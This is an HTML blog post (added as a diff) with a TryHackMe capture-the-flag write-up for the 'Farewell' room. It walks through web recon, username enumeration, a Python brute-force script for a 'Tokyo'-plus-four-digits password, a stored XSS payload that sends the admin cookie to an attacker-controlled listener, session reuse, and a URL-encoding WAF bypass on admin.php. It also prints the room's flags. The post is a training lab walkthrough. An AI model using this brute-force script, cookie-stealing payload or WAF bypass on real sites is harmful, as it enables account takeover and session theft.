@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Farewell | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF — WAF bypass via user-agent disguise, username enumeration with password hint, Tokyo+4-digit brute force, stored XSS via farewell message form, admin cookie reuse, single-character URL encoding to bypass WAF on admin.php.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/farewell.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/farewell.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Farewell">
+<meta property="og:description" content="TryHackMe CTF — WAF bypass via user-agent disguise, username enumeration with password hint, Tokyo+4-digit brute force, stored XSS via farewell message form, admin cookie reuse, single-character URL encoding to bypass WAF on admin.php.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Farewell">
+<meta name="twitter:description" content="TryHackMe CTF — WAF bypass via user-agent disguise, username enumeration with password hint, Tokyo+4-digit brute force, stored XSS via farewell message form, admin cookie reuse, single-character URL encoding to bypass WAF on admin.php.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Farewell</h1>
+    <div class="post-description">TryHackMe CTF. A decommissioning server, a farewell message form, and a WAF that thinks it&rsquo;s doing a great job. One of us is right.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>A PHP that restarts all services and a proverbial greeting card on a server.</p>
+
+<p>Get your <code>curls</code> ready for a night on the town.</p>
+
+<p><em>The room target IP rotated between sessions and restarts. The final exploit was completed against <code>10.146.138.121</code>. Earlier recon stages used the IPs active at the time.</em></p>
+
+<hr>
+
+<h2>Initial Recon</h2>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ curl -I 10.145.169.251</code></pre>
+
+<p>A malformed <code>curl</code> to start, but stick with me:</p>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 6.32.27 AM.png" alt="malformed curl returning a PHPSESSID despite resolution warning" style="max-width:100%;margin:2rem 0;">
+
+<p>Would you look at that. A session cookie (<code>PHPSESSID</code>). For me? How kind.</p>
+
+<p>Since <code>Mozilla/5.0</code> was not attached to <code>-A</code>, <code>curl</code> treated it like a separate target and tossed a resolution warning. It still continued on to the actual target and returned a valid <code>PHPSESSID</code>.</p>
+
+<p>Proper syntax:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ curl -I -A "Mozilla/5.0" http://10.145.169.251</code></pre>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 6.36.34 AM.png" alt="proper curl with Mozilla UA returning clean headers and PHPSESSID" style="max-width:100%;margin:2rem 0;">
+
+<p>This is the second challenge in a course of Firewall vulnerability assessments. Fresh <code>PHPSESSID</code> stashed for later.</p>
+
+<p><strong>What we know so far:</strong></p>
+<ul>
+<li>A firewall exists</li>
+<li>User-agent disguising bypasses some firewall rules</li>
+<li>A session cookie is in hand</li>
+<li>A PHP loginForm exists on the target</li>
+<li>The server will be decommissioned in 24 hours</li>
+<li>Goodbye messages to the server can be seen on the homepage</li>
+<li>An admin and/or message bot is highly likely</li>
+<li><code>check.js</code> exists</li>
+<li><code>adam</code>, <code>deliver</code>, and <code>nora</code> exist, and have co-dependency issues with a server</li>
+</ul>
+
+<p>Must have been one great server. Or it is sick of its end-users waxing poetic when they should be maximizing efficiency. Who knows.</p>
+
+<hr>
+
+<h2>Nmap</h2>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ nmap -sS -Pn -sC -sV -T4 -A 10.145.169.251</code></pre>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.145.169.251</code></pre>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 6.30.32 AM.png" alt="nmap vuln scan output" style="max-width:100%;margin:2rem 0;">
+
+<p>Findings from the vuln scan worth knowing about:</p>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 6.51.15 AM.png" alt="nmap findings showing /admin.php and httponly flag not set" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Also now known:</strong></p>
+<ul>
+<li>Port 22 open</li>
+<li>Port 80 open</li>
+<li><code>httponly flag not set</code> is great news for the stolen cookie</li>
+<li><code>/admin.php</code> exists sans <code>httponly</code> flag</li>
+<li>Per the room intro, <code>/admin</code> also holds all of the farewell messages</li>
+<li><code>/info.php</code> exists, which could contain credentials, firewall details, etc.</li>
+<li>The ominous auto-resetting <code>/status.php</code> has not yet been enumerated</li>
+<li>The homepage has a PHP <code>loginForm</code> that a bot likely moderates</li>
+</ul>
+
+<p>The missing <code>/status.php</code> that essentially self-destructs is calling for more attention.</p>
+
+<hr>
+
+<h2>Authenticated Enumeration</h2>
+
+<p><code>gobuster</code> with a fresh session cookie and a full Chrome UA string:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ gobuster dir -u http://10.145.169.251/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+  -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
+  -x php,txt,conf,log -t 50 \
+  -c "PHPSESSID=tbpitgmsugg0eaqdmpliqqcjb2"</code></pre>
+
+<p>If there is any pushback about the <code>-t 50</code>, add:</p>
+
+<pre><code>-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</code></pre>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 4.23.20 PM.png" alt="gobuster results showing /status.php returning 200" style="max-width:100%;margin:2rem 0;">
+
+<p>The elusive <code>/status.php</code> returning a 200, and a <code>/server-status</code> serving a 403.</p>
+
+<p>Trying <code>feroxbuster</code> next, with <code>-C 302</code> to filter out the redirect noise. Grabbed a fresh session cookie for it:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ feroxbuster -u http://10.146.161.245/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
+  -x php,txt,conf,log -t 50 \
+  --cookies "PHPSESSID=0jhitkhfk4gt6k71g046k0c93p" \
+  -C 302</code></pre>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 5.06.19 PM.png" alt="feroxbuster results showing /auth.php returning 405" style="max-width:100%;margin:2rem 0;">
+
+<p>Ahh. Glad I ran this. <code>/auth.php</code> returning a 405. That is where the logins are actually served, and gobuster missed it. Different tool, different parsing logic, different finding. Worth noting for future engagements.</p>
+
+<hr>
+
+<h2>User Access</h2>
+
+<p>Alright. Let&rsquo;s bust this dinoserver open.</p>
+
+<p>The homepage, in-browser. The cute little bye-bye server messages are scrolling across the banner.</p>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 4.36.10 PM.png" alt="homepage in browser with farewell messages scrolling across the banner" style="max-width:100%;margin:2rem 0;">
+
+<p>I used <code>deliver11</code> as the handle because it is the only username-appearing handle on the farewell messages:</p>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 4.41.21 PM.png" alt="deliver11 handle visible in the farewell messages banner" style="max-width:100%;margin:2rem 0;">
+
+<p>That is a valid username. Thanks, old server.</p>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 4.42.58 PM.png" alt="login form confirming deliver11 is a valid username" style="max-width:100%;margin:2rem 0;">
+
+<p>Grab that <code>PHPSESSID</code>, please and thank you. Dev Tools &gt; Storage &gt; swap in the Value field with the stolen cookie.</p>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 4.43.35 PM.png" alt="Burp intercepting a response with a password hint in the body" style="max-width:100%;margin:2rem 0;">
+
+<p>Well would you look at that. Burp caught a response with a password hint.</p>
+
+<p>Good guess on the user, Jenn. To be fair, the other two users likely have similar plaintext hints, but <code>deliver11</code> is very crackable.</p>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 4.45.03 PM.png" alt="password hint: Capital of Japan followed by 4 digits" style="max-width:100%;margin:2rem 0;">
+
+<p>&ldquo;Capital of Japan followed by 4 digits&rdquo; is the password hint. If I had to guess, 1868 = year Tokyo was formally designated the imperial capital.</p>
+
+<p>To note for our later privesc to admin: the login POST request points to <code>/auth.php</code> as a JSON request, not HTML.</p>
+
+<img src="/images/farewell/Screenshot 2026-05-19 at 6.15.19 AM.png" alt="Burp showing login POST to /auth.php as a JSON request" style="max-width:100%;margin:2rem 0;">
+
+<p>Whipping up a script to brute force the four digits:</p>
+
+<pre><code>nano tokyo_crypt.py</code></pre>
+
+<pre><code>import requests
+import random
+
+USERNAME = 'deliver11'
+TARGET = 'http://10.146.161.245/auth.php'
+
+USER_AGENTS = [
+    'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
+]
+
+# Session reuse keeps the TCP/TLS connection alive across requests
+session = requests.Session()
+
+for x in range(1000, 10000):
+    url = f'{TARGET}?i={x}'
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': random.choice(USER_AGENTS),
+    }
+    data = f'username={USERNAME}&amp;password=Tokyo{x}'
+
+    try:
+        resp = session.post(url, headers=headers, data=data, timeout=5)
+    except requests.RequestException as e:
+        print(f'[ERROR] Tokyo{x}: {e}')
+        continue
+
+    if 'auth_failed' in resp.text:
+        print(f'[FAILED] Payload: "Tokyo{x}", Code: {resp.status_code} || Content: {len(resp.content)}')
+    else:
+        print(f'[SUCCESS] Payload: "Tokyo{x}", Code: {resp.status_code} || Content: {len(resp.content)}')
+        break</code></pre>
+
+<p>Run it:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ python3 tokyo_crypt.py</code></pre>
+
+<p>Thank you, <code>deliver11</code>. You may want to change your password (wink).</p>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 5.04.48 PM.png" alt="tokyo_crypt.py output showing the successful password match" style="max-width:100%;margin:2rem 0;">
+
+<p>Flag 1 = nabbed.</p>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 5.07.47 PM.png" alt="user flag captured" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Stored XSS to Admin</h2>
+
+<p>The farewell message form is where we will be injecting malicious payloads. Test its behavior first:</p>
+
+<pre><code>&lt;script&gt;alert()&lt;/script&gt;</code></pre>
+
+<p>Noted, and a little offended. Not sure why.</p>
+
+<img src="/images/farewell/Screenshot 2026-05-18 at 5.10.30 PM.png" alt="script alert payload blocked by the form filter" style="max-width:100%;margin:2rem 0;">
+
+<p>Strong intuition that this form behaves exactly as the one in Padelify does. One key difference: we are targeting JSON, and Padelify targeted PHP.</p>
+
+<p>Test the form&rsquo;s response to non-malicious input:</p>
+
+<img src="/images/farewell/Screenshot 2026-05-19 at 6.41.25 AM.png" alt="non-malicious farewell message submitted to the form" style="max-width:100%;margin:2rem 0;">
+
+<p>Hehehe. Have to throw in a little bit of sass.</p>
+
+<img src="/images/farewell/Screenshot 2026-05-19 at 6.42.32 AM.png" alt="farewell message accepted successfully" style="max-width:100%;margin:2rem 0;">
+
+<p>Success.</p>
+
+<p>Now mirror the XSS technique from yesterday that bypassed the WAF rules. Don&rsquo;t forget the listener first:</p>
+
+<pre><code>python3 -m http.server 8888</code></pre>
+
+<pre><code>&lt;body onload="new Image().src='http://192.168.128.19:8888?c='+document['coo'+'kie'];"&gt;</code></pre>
+
+<p>And&hellip;gotcha!</p>
+
+<p>Let&rsquo;s curl this home:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ curl -i -b 'PHPSESSID=uh0q23tnqrjc2sb7ucsu6re15j' http://10.146.138.121/dashboard.php</code></pre>
+
+<img src="/images/farewell/Screenshot 2026-05-19 at 6.52.56 AM.png" alt="curl dashboard.php with stolen admin cookie returning dashboard content" style="max-width:100%;margin:2rem 0;">
+
+<p>Next, <code>curl</code> <code>/admin.php</code> with the freshly stolen cookie:</p>
+
+<pre><code>curl -i -b 'PHPSESSID=uh0q23tnqrjc2sb7ucsu6re15j' http://10.146.138.121/admin.php</code></pre>
+
+<p>Blocked by the WAF.</p>
+
+<img src="/images/farewell/Screenshot 2026-05-19 at 7.01.39 AM.png" alt="curl admin.php returning WAF block" style="max-width:100%;margin:2rem 0;">
+
+<p>Let&rsquo;s get craftier and target <code>/status.php</code> since the server status is almost-dead:</p>
+
+<pre><code>curl -i -b 'PHPSESSID=uh0q23tnqrjc2sb7ucsu6re15j' http://10.146.138.121/status.php</code></pre>
+
+<p>Awesome-sauce. 200 OK returned from <code>/status.php</code>:</p>
+
+<img src="/images/farewell/Screenshot 2026-05-19 at 7.06.16 AM.png" alt="curl status.php returning 200 OK part 1" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/farewell/Screenshot 2026-05-19 at 7.08.37 AM.png" alt="curl status.php 200 OK response part 2" style="max-width:100%;margin:2rem 0;">
+
+<p>Now we know the web app can check <code>admin.php</code> despite the direct <code>curl</code> getting WAF&rsquo;d away.</p>
+
+<p>Take a tip from the Burp JSON request and query the status of the JSON endpoint to see if the backend is reachable:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ curl -i -b 'PHPSESSID=uh0q23tnqrjc2sb7ucsu6re15j' \
+'http://10.146.138.121/status.php?fetch_status=1'</code></pre>
+
+<p>Hello there, backend.</p>
+
+<p>Ugh. I heard aloud in my head while I typed it. It was an innocent remark. I am not hitting backspace.</p>
+
+<img src="/images/farewell/Screenshot 2026-05-19 at 7.10.04 AM.png" alt="fetch_status=1 confirming admin is reachable from the backend" style="max-width:100%;margin:2rem 0;">
+
+<p><code>fetch_status=1</code> means the admin is reachable in the eyes of the backend. That really does sound bad.</p>
+
+<p>Given this new backend admin availability information, send a restart:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ curl -i -X POST \
+-b 'PHPSESSID=uh0q23tnqrjc2sb7ucsu6re15j' \
+-d 'restart=1' \
+http://10.146.138.121/status.php</code></pre>
+
+<p>Aha. Found the governing script for <code>/status.php</code>.</p>
+
+<img src="/images/farewell/Screenshot 2026-05-19 at 7.14.45 AM.png" alt="restart=1 POST response revealing the governing script path" style="max-width:100%;margin:2rem 0;">
+
+<p>More importantly, we see that <code>status.php</code> can check <code>admin.php</code> thanks to the 200 OK. If we <code>curl</code> <code>admin.php</code> directly, the WAF blocks us.</p>
+
+<p>Time to encode. Time for full-metal Jenn.</p>
+
+<p>Full-Metal Jenn does not mess around. Straight to encoding the admin path:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ curl -i -b 'PHPSESSID=uh0q23tnqrjc2sb7ucsu6re15j' \
+'http://10.146.138.121/%61dmin.php'</code></pre>
+
+<p>I kid you not: I did not try any approaches that I am keeping out of my notes to look better.</p>
+
+<p>Full-Metal Jenn FTW.</p>
+
+<img src="/images/farewell/Screenshot 2026-05-19 at 7.20.37 AM.png" alt="URL character encoding bypass on admin.php returning flags" style="max-width:100%;margin:2rem 0;">
+
+<p>User flag: <code>THM{USER_ACCESS_1010}</code></p>
+<p>Admin flag: <code>THM{ADMINP@wned007}</code></p>
+
+<img src="/images/farewell/Screenshot 2026-05-19 at 7.21.56 AM.png" alt="both user and admin flags displayed on screen" style="max-width:100%;margin:2rem 0;">
+
+<p>Full-Metal Jenn = out.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code># Initial recon
+curl -I -A "Mozilla/5.0" http://10.145.169.251
+nmap -sS -Pn -sC -sV -T4 -A 10.145.169.251
+nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.145.169.251
+
+# Authenticated enumeration (session cookie + full Chrome UA)
+gobuster dir -u http://10.145.169.251/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+  -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
+  -x php,txt,conf,log -t 50 \
+  -c "PHPSESSID=SESSION_ID"
+
+feroxbuster -u http://TARGET_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
+  -x php,txt,conf,log -t 50 \
+  --cookies "PHPSESSID=SESSION_ID" \
+  -C 302
+
+# Valid username discovery via login form -- captured password hint in Burp
+# "Capital of Japan followed by 4 digits"
+
+# Brute force the 4-digit suffix via tokyo_crypt.py
+python3 tokyo_crypt.py
+# Result: Tokyo1868 -- user flag retrieved
+
+# Stored XSS in farewell_message field -- admin bot reviews submissions
+python3 -m http.server 8888
+# Payload submitted via farewell message form:
+# &lt;body onload="new Image().src='http://ATTACKER_IP:8888?c='+document['coo'+'kie'];"&gt;
+
+# Reuse stolen admin PHPSESSID
+curl -i -b 'PHPSESSID=ADMIN_SESSION' http://TARGET_IP/dashboard.php
+
+# Direct /admin.php blocked by WAF
+# Confirm backend admin reachability via status.php
+curl -i -b 'PHPSESSID=ADMIN_SESSION' 'http://TARGET_IP/status.php?fetch_status=1'
+
+# WAF path-character bypass: URL-encode the first character
+curl -i -b 'PHPSESSID=ADMIN_SESSION' 'http://TARGET_IP/%61dmin.php'
+# Admin flag retrieved</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
